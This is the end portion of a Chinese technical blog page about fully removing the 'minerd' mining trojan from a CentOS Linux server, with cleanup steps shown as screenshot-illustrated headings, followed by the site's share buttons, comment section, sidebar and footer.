+<p><img src="/2016/10/26/&#x5F7B;&#x5E95;&#x6E05;&#x9664;Linux centos minerd&#x6728;&#x9A6C;/16.jpg" alt="16.jpg"><br><img src="/2016/10/26/&#x5F7B;&#x5E95;&#x6E05;&#x9664;Linux centos minerd&#x6728;&#x9A6C;/17.jpg" alt="17.jpg"></p>
+<p>3&#x3001;&#x5E72;&#x6389;&#x6728;&#x9A6C;&#x8FDB;&#x7A0B;&#x53CA;&#x5176;&#x6587;&#x4EF6;</p>
+<p><img src="/2016/10/26/&#x5F7B;&#x5E95;&#x6E05;&#x9664;Linux centos minerd&#x6728;&#x9A6C;/18.jpg" alt="18.jpg"></p>
+<p>4&#x3001;&#x5E72;&#x6389;&#x5B89;&#x88C5;&#x6587;&#x4EF6;&#x53CA;&#x514D;&#x5BC6;&#x767B;&#x5F55;&#x7684;&#x6587;&#x4EF6;</p>
+<p><img src="/2016/10/26/&#x5F7B;&#x5E95;&#x6E05;&#x9664;Linux centos minerd&#x6728;&#x9A6C;/19.jpg" alt="19.jpg"></p>
+<p>5&#x3001;&#x5E72;&#x6389;&#x968F;&#x7CFB;&#x7EDF;&#x542F;&#x52A8;&#x7684;&#x6587;&#x4EF6;</p>
+<p><img src="/2016/10/26/&#x5F7B;&#x5E95;&#x6E05;&#x9664;Linux centos minerd&#x6728;&#x9A6C;/20.jpg" alt="20.jpg"></p>
+<p>6&#x3001;top&#x4E00;&#x4E0B; &#x4E00;&#x5207;&#x90FD;&#x6B63;&#x5E38;&#x4E86;&#xFF01;</p>
+<p><img src="/2016/10/26/&#x5F7B;&#x5E95;&#x6E05;&#x9664;Linux centos minerd&#x6728;&#x9A6C;/21.jpg" alt="21.jpg"></p>
+<p>7&#x3001;&#x91CD;&#x542F;&#x4E00;&#x4E0B;&#xFF0C;&#x4E5F;&#x6CA1;&#x95EE;&#x9898;&#x4E86;</p>
+<p><img src="/2016/10/26/&#x5F7B;&#x5E95;&#x6E05;&#x9664;Linux centos minerd&#x6728;&#x9A6C;/22.jpg" alt="22.jpg"></p>
+
+        
+        </div>
+        <footer class="article-footer">
+            <div class="share-container">
+
+
+    <div class="bdsharebuttonbox">
+    <a href="#" class="bds_more" data-cmd="more">分享到：</a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间">QQ空间</a>
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博">新浪微博</a>
+    <a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博">腾讯微博</a>
+    <a href="#" class="bds_renren" data-cmd="renren" title="分享到人人网">人人网</a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信">微信</a>
+</div>
+<script>
+window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"16"},"share":{"bdSize":16}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+<style>
+    .bdshare_popup_box {
+        border-radius: 4px;
+        border: #e1e1e1 solid 1px;
+    }
+    .bdshare-button-style0-16 a,
+    .bdshare-button-style0-16 .bds_more {
+        padding-left: 20px;
+        margin: 6px 10px 6px 0;
+    }
+    .bdshare_dialog_list a,
+    .bdshare_popup_list a,
+    .bdshare_popup_bottom a {
+        font-family: 'Microsoft Yahei';
+    }
+    .bdshare_popup_top {
+        display: none;
+    }
+    .bdshare_popup_bottom {
+        height: auto;
+        padding: 5px;
+    }
+</style>
+
+
+</div>
+
+            
+    
+        <a href="http://www.wangxin123.com/2016/10/26/彻底清除Linux centos minerd木马/#comments" class="article-comment-link ds-thread-count" data-thread-key="http://www.wangxin123.com/2016/10/26/彻底清除Linux centos minerd木马/">评论</a>
+    
+
+        </footer>
+    </div>
+    
+        
+<nav id="article-nav">
+    
+    
+        <a href="/2016/10/20/MySQL同步报错故障处理集锦/" id="article-nav-older" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">下一篇</strong>
+            <div class="article-nav-title">MySQL同步报错故障处理集锦</div>
+        </a>
+    
+</nav>
+
+
+    
+</article>
+
+
+    
+    <section id="comments">
+    
+        
+    <div class="ds-thread" data-thread-key="2016/10/26/彻底清除Linux centos minerd木马/" data-title="彻底清除Linux centos minerd木马" data-url="http://www.wangxin123.com/2016/10/26/彻底清除Linux centos minerd木马/"></div>
+    <style>
+        #ds-thread #ds-reset .ds-textarea-wrapper {
+            background: none;
+        }
+        #ds-reset .ds-avatar img {
+            box-shadow: none;
+        }
+        #ds-reset .ds-gradient-bg {
+            background: #f7f7f7;
+        }
+        #ds-thread #ds-reset li.ds-tab a {
+            border-radius: 3px;
+        }
+        #ds-thread #ds-reset .ds-post-button {
+            color: white;
+            border: none;
+            box-shadow: none;
+            background: #d32;
+            text-shadow: none;
+            font-weight: normal;
+            font-family: 'Microsoft Yahei';
+        }
+        #ds-thread #ds-reset .ds-post-button:hover {
+            color: white;
+            background: #DE594C;
+        }
+        #ds-thread #ds-reset .ds-post-button:active {
+            background: #d32;
+        }
+        #ds-smilies-tooltip ul.ds-smilies-tabs li a.ds-current {
+            color: white;
+            background: #d32;
+            box-shadow: none;
+            text-shadow: none;
+            font-weight: normal;
+        }
+    </style>
+
+    
+    </section>
+
+</section>
+            
+                <aside id="sidebar">
+   
+        
+    <div class="widget-wrap">
+        <object type="application/x-shockwave-flash" style="outline:none;" data="http://cdn.abowman.com/widgets/hamster/hamster.swf?" width="200" height="170"><param name="movie" value="http://cdn.abowman.com/widgets/hamster/hamster.swf?"></param><param name="AllowScriptAccess" value="always"></param><param name="wmode" value="opaque"></param></object>
+    </div>
+    <div class="widget-wrap">
+        <h3 class="widget-title">最新文章</h3>
+        <div class="widget">
+            <ul id="recent-post" class="">
+                
+                    <li>
+                        <div class="item-thumbnail">
+                            <p class="item-category"><a class="article-category-link" href="/categories/错误集锦/">错误集锦</a></p>
+                            <p class="item-title"><a href="/2016/10/26/彻底清除Linux centos minerd木马/" class="title">彻底清除Linux centos minerd木马</a></p>
+                            <p class="item-date"><time datetime="2016-10-26T14:41:19.000Z" itemprop="datePublished">2016-10-26</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        <div class="item-thumbnail">
+                            <p class="item-category"><a class="article-category-link" href="/categories/错误集锦/">错误集锦</a></p>
+                            <p class="item-title"><a href="/2016/10/20/MySQL同步报错故障处理集锦/" class="title">MySQL同步报错故障处理集锦</a></p>
+                            <p class="item-date"><time datetime="2016-10-20T13:18:00.000Z" itemprop="datePublished">2016-10-20</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        <div class="item-thumbnail">
+                            <p class="item-category"><a class="article-category-link" href="/categories/运维部署/">运维部署</a></p>
+                            <p class="item-title"><a href="/2016/10/18/MySQL中间件Atlas安装及使用/" class="title">MySQL中间件Atlas安装及使用</a></p>
+                            <p class="item-date"><time datetime="2016-10-18T10:24:17.000Z" itemprop="datePublished">2016-10-18</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        <div class="item-thumbnail">
+                            <p class="item-category"><a class="article-category-link" href="/categories/运维部署/">运维部署</a></p>
+                            <p class="item-title"><a href="/2016/10/17/zabbix安装/" class="title">zabbix安装</a></p>
+                            <p class="item-date"><time datetime="2016-10-17T14:41:19.000Z" itemprop="datePublished">2016-10-17</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        <div class="item-thumbnail">
+                            <p class="item-category"><a class="article-category-link" href="/categories/运维部署/">运维部署</a></p>
+                            <p class="item-title"><a href="/2016/10/14/MySQL主从切换/" class="title">MySQL主从切换</a></p>
+                            <p class="item-date"><time datetime="2016-10-14T14:22:00.000Z" itemprop="datePublished">2016-10-14</time></p>
+                        </div>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+    
+        
+    <div class="widget-wrap">
+        <h3 class="widget-title">分类</h3>
+        <div class="widget">
+            <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/WEB后端/">WEB后端</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/其他技术/">其他技术</a><span class="category-list-count">10</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/我的收藏/">我的收藏</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/相关感悟/">相关感悟</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/运维部署/">运维部署</a><span class="category-list-count">15</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/错误集锦/">错误集锦</a><span class="category-list-count">7</span></li></ul>
+        </div>
+    </div>
+
+    
+        
+    <!-- div class="widget-wrap">
+        <h3 class="widget-title">归档</h3>
+        <div class="widget">
+            <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">十月 2016</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">九月 2016</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">八月 2016</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">七月 2016</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">六月 2016</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">五月 2016</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">四月 2016</a><span class="archive-list-count">5</span></li></ul>
+        </div>
+    </div -->
+
+    
+        
+    <!-- div class="widget-wrap">
+        <h3 class="widget-title">标签云</h3>
+        <div class="widget tagcloud">
+            <a href="/tags/Druid/" style="font-size: 10px;">Druid</a> <a href="/tags/ES/" style="font-size: 10px;">ES</a> <a href="/tags/HttpsDNS/" style="font-size: 10px;">HttpsDNS</a> <a href="/tags/Maven/" style="font-size: 10px;">Maven</a> <a href="/tags/MyBatis/" style="font-size: 10px;">MyBatis</a> <a href="/tags/MySQL/" style="font-size: 10px;">MySQL</a> <a href="/tags/Swagger/" style="font-size: 10px;">Swagger</a> <a href="/tags/atlas/" style="font-size: 10px;">atlas</a> <a href="/tags/concurrent/" style="font-size: 13.33px;">concurrent</a> <a href="/tags/git/" style="font-size: 10px;">git</a> <a href="/tags/github/" style="font-size: 10px;">github</a> <a href="/tags/hadoop/" style="font-size: 11.67px;">hadoop</a> <a href="/tags/hexo/" style="font-size: 10px;">hexo</a> <a href="/tags/jenkins/" style="font-size: 10px;">jenkins</a> <a href="/tags/mysql/" style="font-size: 20px;">mysql</a> <a href="/tags/nginx/" style="font-size: 10px;">nginx</a> <a href="/tags/redis/" style="font-size: 16.67px;">redis</a> <a href="/tags/shiro/" style="font-size: 10px;">shiro</a> <a href="/tags/solr/" style="font-size: 11.67px;">solr</a> <a href="/tags/sonar/" style="font-size: 10px;">sonar</a> <a href="/tags/zabbix/" style="font-size: 18.33px;">zabbix</a> <a href="/tags/初始化块/" style="font-size: 10px;">初始化块</a> <a href="/tags/大数据/" style="font-size: 15px;">大数据</a> <a href="/tags/性能调优/" style="font-size: 10px;">性能调优</a> <a href="/tags/疑难杂症/" style="font-size: 11.67px;">疑难杂症</a> <a href="/tags/监控/" style="font-size: 10px;">监控</a> <a href="/tags/线程池/" style="font-size: 10px;">线程池</a> <a href="/tags/运维/" style="font-size: 10px;">运维</a> <a href="/tags/集合/" style="font-size: 10px;">集合</a>
+        </div>
+    </div -->
+
+    
+        
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">链接</h3>
+        <div class="widget">
+            <ul>
+                
+                    <li>
+                        <a href="https://yq.aliyun.com/articles">云栖社区</a>
+                    </li>
+                
+                    <li>
+                        <a href="http://tech.meituan.com/">美团点评技术团队</a>
+                    </li>
+                
+                    <li>
+                        <a href="http://www.aboutyun.com/">大数据虾米工作室</a>
+                    </li>
+                
+                    <li>
+                        <a href="http://www.iyunv.com/">运维网</a>
+                    </li>
+                
+                    <li>
+                        <a href="http://www.whycss.com/">前端网址导航</a>
+                    </li>
+                
+                    <li>
+                        <a href="http://www.jianshu.com/users/4762d2980c91/latest_articles">静卧人间</a>
+                    </li>
+                
+                    <li>
+                        <a href="http://hexo.io">Hexo</a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+
+    
+    <div id="toTop" class="fa fa-angle-up"></div>
+</aside>
+            
+        </div>
+        <footer id="footer">
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            &copy; 2016 Wasim<br>
+            Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>. Theme by <a href="http://github.com/ppoffice">PPOffice</a>
+            <script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1259376280'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s11.cnzz.com/z_stat.php%3Fid%3D1259376280%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>
+        </div>
+    </div>
+</footer>
+        
+    
+    <script type="text/javascript">
+    var duoshuoQuery = {short_name:'wangxin37'};
+    (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0]
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+    </script>
+
+
+
+    
+        <script src="/vendor/fancybox/jquery.fancybox.pack.js"></script>
+    
+
+
+<!-- Custom Scripts -->
+<script src="/js/main.js"></script>
+
+    </div>
+</body>
+</html>
